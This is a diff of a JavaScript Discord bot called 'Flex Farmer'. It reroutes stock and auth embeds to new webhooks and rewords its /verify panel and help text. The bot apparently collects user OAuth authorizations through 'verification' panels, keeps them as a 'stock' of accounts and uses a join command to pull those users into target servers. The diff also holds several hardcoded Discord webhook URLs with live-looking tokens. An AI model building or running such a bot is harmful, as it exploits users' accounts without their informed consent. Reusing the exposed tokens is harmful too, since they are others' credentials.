@@ -29,9 +29,10 @@ const EMBED_COLOR = 0x2F3136; // Sleek grey-black tone
 // --- Dedicated Webhook Clients ---
 const WEBHOOKS = {
     RESTOCK: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062223049789462/5Mf4bAK5hH33ArZ2PNTZF7GB2ccp4ZClErmt5KIv1v5VROS3tmiVZRR5pnbcyutAyIVc' }),
-    LIVE_STOCK: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062223049789462/5Mf4bAK5hH33ArZ2PNTZF7GB2ccp4ZClErmt5KIv1v5VROS3tmiVZRR5pnbcyutAyIVc' }),
+    LIVE_STOCK: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062337184923821/P3j22VibL9VSasIPfR2EEFu9n4_AIaIa65je-2joyPMAge-ZEOZXDAgwRRGoHhE1RlzM' }),
     ADD_BOT: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062454743007316/MhzdNOi6VDiVthZh9-p4YwUdWMTRrC926xohzUu3mvw1yOXkwtH9BQFshApFcrOcsIL4' }),
     VERIFICATION: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565060498955698436/Y3TO5kufTLMNpJVt5wXCxV-nxXP0eH4qz7kxkS299viAANZLKwiTjYVyPZAdnUPSSW9g' }),
+    AUTH: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565082617387286659/moMXyDZt7yk02ZEcWlpRPBpNiZkV2rOOFyjSA21jv7cIRwj4KzjCO20gIMYTDsO3D3vm' }),
     BOOST_STICK: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062620732465294/5mZAWSI6o05Q_EHdWX67qE2ws5qIKvsXgTqWC8h1khpFmKHtqNTxWt7Ann2nqklA7y3Q' }),
     USE_R_BOT: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062878569041920/BklXjuG2g9QoqEwgtcTchZvpYqMOzFhl5Wnjp8fb3c1IZZedoAOwuqW0C6b_9yyYXB51' }),
     STATUS: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565063716674863245/hGnnYlGvnmiH08d0PfTqhW_7t97XDI1PaVqXMb-9_2qI3CGeZA6NgNPXncfNwUEG5BmD' }),
@@ -130,16 +131,16 @@ const client = new Client({
 const slashCommands = [
     new SlashCommandBuilder()
         .setName('verify')
-        .setDescription('Create a customized verification panel with link button')
-        .addStringOption(option => option.setName('description').setDescription('Main embed message text').setRequired(true))
+        .setDescription('Create a verified panel with interactive button')
+        .addStringOption(option => option.setName('description').setDescription('Main embed description text').setRequired(true))
         .addStringOption(option => option.setName('title').setDescription('Optional embed title').setRequired(false))
-        .addStringOption(option => option.setName('webhook_url').setDescription('Optional custom Webhook URL to dispatch through').setRequired(false)),
+        .addStringOption(option => option.setName('webhook_url').setDescription('Optional custom Webhook URL').setRequired(false)),
     new SlashCommandBuilder()
         .setName('say')
         .setDescription('Send custom message or embed')
         .addStringOption(option => option.setName('message').setDescription('Content to send').setRequired(true))
         .addBooleanOption(option => option.setName('embed').setDescription('Send as embed format').setRequired(false))
-        .addStringOption(option => option.setName('webhook_url').setDescription('Optional Webhook URL to send through').setRequired(false))
+        .addStringOption(option => option.setName('webhook_url').setDescription('Optional Webhook URL').setRequired(false))
 ].map(command => command.toJSON());
 
 // --- Modern Centered Web Server Routes for OAuth Callbacks ---
@@ -311,7 +312,8 @@ async function updateLiveStockPanel() {
             }
         }
 
-        const newMsg = await stockChannel.send({ embeds: [stockEmbed] });
+        // Send via dedicated live stock webhook client using standard payload structure
+        const newMsg = await WEBHOOKS.LIVE_STOCK.send({ embeds: [stockEmbed], wait: true });
         dbData.liveStockMessageId = newMsg.id;
         writeDB(dbData);
     } catch (err) {
@@ -397,9 +399,9 @@ client.on('interactionCreate', async interaction => {
                 return interaction.reply({ content: 'Verification embed sent via target webhook.', ephemeral: true });
             }
 
-            // Dispatches through your specific Verification webhook channel by default
+            // Fixed: Now correctly sends BOTH the embed and components (buttons) through the Verification webhook
             await WEBHOOKS.VERIFICATION.send({ embeds: [embed], components: [row] });
-            return interaction.reply({ content: 'Verification embed created successfully via Verification webhook.', ephemeral: true });
+            return interaction.reply({ content: 'Verification embed with link button created successfully!', ephemeral: true });
         } catch (err) {
             return interaction.reply({ content: `Failed to create verification panel: ${err.message}`, ephemeral: true });
         }
@@ -433,7 +435,7 @@ client.on('interactionCreate', async interaction => {
     }
 });
 
-// --- 2-Hour Inactivity Kick Tracking ---
+// --- 2-Hour Inactivity Kick Tracking & Auto-Delete Channel Handler ---
 const pendingJoins = new Map();
 
 client.on('guildMemberAdd', member => {
@@ -477,6 +479,7 @@ client.on('messageCreate', async message => {
         return;
     }
 
+    // Auto-Delete Channel Logic (1563253483824746659)
     if (message.channel.id === CHANNELS.AUTO_DELETE) {
         setTimeout(async () => {
             try { if (message.deletable) await message.delete(); } catch (err) {}
@@ -511,7 +514,7 @@ client.on('messageCreate', async message => {
             .addFields(
                 { 
                     name: 'Core & Verification', 
-                    value: `\`/verify\` - Slash command to generate customizable verification embed with link button\n\`/say\` - Slash command to send messages/embeds\n\`${currentPrefix}stock\` - Views total active accounts\n\`${currentPrefix}auth\` - Displays authorization stats\n\`${currentPrefix}join <serverID>\` - Requests members to join target server\n\`${currentPrefix}bot\` - Bot invite button\n\`${currentPrefix}status\` - Bot operational status` 
+                    value: `\`/verify\` - Slash command to generate verification embed with button\n\`/say\` - Slash command to send messages/embeds\n\`${currentPrefix}stock\` - Views total active accounts\n\`${currentPrefix}auth\` - Displays authorization stats\n\`${currentPrefix}join <serverID>\` - Requests members to join target server\n\`${currentPrefix}bot\` - Bot invite button\n\`${currentPrefix}status\` - Bot operational status` 
                 },
                 { 
                     name: 'Config & Management', 
@@ -536,7 +539,7 @@ client.on('messageCreate', async message => {
         const users = Object.values(dbData.users);
         const lastRestockCount = Math.min(dbData.restockCounter || 0, users.length);
         const stockEmbed = new EmbedBuilder().setTitle('Flex Farmer Stock').setDescription(`Available users that can join servers from the last restock: **\`${lastRestockCount}\`**`).setColor(EMBED_COLOR);
-        return WEBHOOKS.STATUS.send({ embeds: [stockEmbed] });
+        return WEBHOOKS.AUTH.send({ embeds: [stockEmbed] });
     }
 
     if (command === 'auth' || command === 'authed') {
@@ -554,7 +557,7 @@ client.on('messageCreate', async message => {
                 { name: 'All-Time', value: `\`${dbData.allTimeAuthCount || 0}\` total authorizations`, inline: true },
                 { name: 'Current Stock', value: `\`${users.length}\` active accounts`, inline: true }
             );
-        return WEBHOOKS.STATUS.send({ embeds: [authEmbed] });
+        return WEBHOOKS.AUTH.send({ embeds: [authEmbed] });
     }
 
     if (command === 'status') {
